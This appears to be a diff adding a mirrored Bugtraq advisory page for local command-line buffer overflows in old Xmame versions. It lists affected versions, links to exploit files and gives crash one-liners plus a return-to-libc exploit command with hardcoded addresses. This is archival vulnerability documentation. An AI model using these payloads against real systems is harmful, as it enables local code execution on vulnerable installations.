@@ -1,0 +1,121 @@
+#SpeeDr00t@Black Falcon<br>#bid16203<p><b><span style="font-size: 18pt;">XMame Multiple Local Command Line Argument Buffer Overflow Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/16203/info">info</a><br><a href="http://www.securityfocus.com/bid/16203/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/16203/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/16203/solution">solution</a><br><a href="http://www.securityfocus.com/bid/16203/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				16203
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 10 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 07 2006 08:55PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to KaiJern, Lau &lt;xwings@mysec.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Xmame Xmame 0.102 <br/>
+					
+				
+					Xmame Xmame 0.69.1 <br/>
+					
+				
+					Xmame Xmame 0.68.1 <br/>
+					
+				
+					Xmame Xmame 0.67.2 <br/>
+					
+				
+					Xmame Xmame 0.67.1 <br/>
+					
+				
+					Xmame Xmame 0.66.2 <br/>
+					
+				
+					Xmame Xmame 0.66.1 <br/>
+					
+				
+					Xmame Xmame 0.62.2 <br/>
+					
+				
+					Xmame Xmame 0.62.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x17000/16203/xmame_exploit.c">#exploit_xmame_exploit.c</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x17000/16203/xmame_bf_exploit.txt">#exploit_xmame_bf_exploit.txt</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples are sufficient to crash the application: <br/>xmame.x11 -pb `ruby -e 'print "A" * 1034'` <br/>xmame.x11 -rec `ruby -e 'print "A" * 1020'` <br/> <br/>The following return-to-libc exploit is also available: <br/>./xmame.x11 -pb `ruby -e 'print "\x90" * 1016;print "\xd0\xf6\xd8\xb7";print "DUMP";print "\xaa\xf8\xff\xbf"'`<br/><br/>Exploit code by Rafael San Miguel Carrasco &lt;smcsoc@yahoo.es&gt; is also available (xmame_bf_exploit.txt).
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/xmame_exploit.c">/data/vulnerabilities/exploits/xmame_exploit.c</a></li>
+<li><a href="http://downloads.#no_exploit/vulnerabilities/exploits/xmame_bf_exploit.txt">http://downloads.#no_exploit/vulnerabilities/exploits/xmame_bf_exploit.txt</a></li>
+</ul>
+</div>
